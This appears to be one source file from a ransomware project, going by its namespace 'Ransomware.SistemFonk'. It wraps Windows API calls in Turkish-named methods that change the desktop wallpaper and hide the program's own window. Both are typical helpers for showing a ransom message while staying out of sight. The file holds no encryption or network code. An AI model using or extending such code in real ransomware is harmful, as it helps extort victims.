using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Ransomware.SistemFonk;

internal class API
{
	private static uint SPI_SETDESKWALLPAPER = 20u;

	private static uint SPIF_UPDATEINIFILE = 1u;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	public static void ArkaplanDegistir(string yol)
	{
		SystemParametersInfo(SPI_SETDESKWALLPAPER, 1u, yol, SPIF_UPDATEINIFILE);
	}

	public static void EkranDurumu(bool durum)
	{
		int nCmdShow = 1;
		if (durum)
		{
			nCmdShow = 0;
		}
		ShowWindow(Process.GetCurrentProcess().MainWindowHandle, nCmdShow);
	}
}
